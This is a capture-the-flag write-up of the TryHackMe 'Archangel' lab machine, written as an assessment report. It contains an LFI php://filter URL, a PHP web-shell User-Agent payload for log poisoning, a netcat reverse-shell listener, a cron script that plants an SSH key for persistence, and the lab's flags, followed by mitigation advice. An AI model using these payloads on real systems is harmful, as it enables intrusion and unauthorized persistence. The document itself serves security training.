#  Cybersecurity Assessment Report - Archangel 

**Prepared by:** Nishanth Antony  
**Date:** September 05, 2025  
**Difficulty:** Easy  
**Category:** Web Exploitation, Privilage Escalation  
**Platform:** Try Hack Me  


---

## 1. Reconnaissance

### 1.1 Service Enumeration

An initial **Nmap scan** was conducted to identify open services:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

* **Port 22 (SSH):** Open, potentially useful for post-exploitation persistence.
* **Port 80 (HTTP):** Hosted a web application named *Wavefire*.

### 1.2 Virtual Host Discovery

* Extracted domain information from the website footer: **mafialive.thm**.
* Added entry in `/etc/hosts` to resolve the hostname.

```bash
echo "10.10.93.69 mafialive.thm" | sudo tee -a /etc/hosts
```

### 1.3 Hidden Resource Discovery

* Retrieved `/robots.txt` which disclosed **/test.php**, a development page.

---

## 2. Exploitation Process

### 2.1 Local File Inclusion (LFI)

* Parameter `?view=` on `test.php` vulnerable to LFI.
* Initial restriction prevented traversal using `../..`.
* Used `php://filter` with base64 encoding to bypass and read source code:

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

* Extracted second flag inside source:

```
thm{explo1t1ng_lf1}
```

### 2.2 Log Poisoning for Remote Code Execution

* Discovered Apache access logs readable through LFI.
* Injected PHP payload via **User-Agent** header:

```http
User-Agent: <?php system($_GET['cmd']); ?>
```

* Included the poisoned log file to execute system commands.
* Retrieved remote PHP reverse shell and gained access as **www-data**.

---

## 3. Proof of Concept (PoC)

* Reverse shell established:

```bash
rlwrap nc -nlvp 4444
connect to [10.8.50.72] from (UNKNOWN) [10.10.99.3] 49310
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

* Extracted user flag:

```
cat /home/archangel/user.txt
thm{lf1_t0_rc3_1s_tr1cky}
```

---

## 4. Privilege Escalation

### 4.1 Cronjob Exploitation

* Found writable script executed by user **archangel** every minute:

```
/opt/helloworld.sh
```

* Replaced with malicious script to append an SSH key:

```bash
#!/bin/bash
mkdir -p /home/archangel/.ssh
echo "ssh-rsa AAAAB3Nz..." >> /home/archangel/.ssh/authorized_keys
```

* Waited for cronjob execution → logged in as **archangel** via SSH.

### 4.2 Root Escalation

* Enumerated `/etc/crontab`, identified another exploitable task owned by **root**.

* Replaced with privilege escalation payload, obtained **root shell**.

* Final flag retrieved:

```
cat /root/root.txt
[REDACTED]
```

---

## 5. Mitigation Recommendations

1. **Web Application Security**

   * Disable **directory traversal and LFI vulnerabilities** through strict input validation.
   * Avoid exposing sensitive files (e.g., `/robots.txt` revealing development endpoints).
   * Sanitize user input and enforce whitelist-based file inclusion.

2. **Log Security**

   * Prevent log poisoning by sanitizing User-Agent headers.
   * Restrict log file read permissions from the web service.

3. **File Permissions**

   * Do not allow world-writable scripts in `/opt` or cron jobs.
   * Apply **principle of least privilege** (cronjobs should not be writable by other users).

4. **System Hardening**

   * Regularly audit **/etc/crontab** and scripts executed with elevated privileges.
   * Enable AppArmor/SELinux for additional confinement.

---

## 6. Lessons Learned & Skills Practiced

* Practical exploitation of **LFI → RCE via log poisoning**.
* Identified and bypassed **basic path traversal protections**.
* Leveraged cronjob misconfigurations for **privilege escalation**.
* Practiced **reverse shell handling, privilege enumeration, and persistence techniques**.
* Reinforced importance of **defense-in-depth**: securing applications, services, and OS-level tasks.

---

 **Report Summary**:
The Archangel machine was compromised by chaining an **LFI vulnerability** into **log poisoning for RCE**, followed by **cronjob privilege escalation**. Multiple misconfigurations and lack of input sanitization facilitated full system compromise.

---

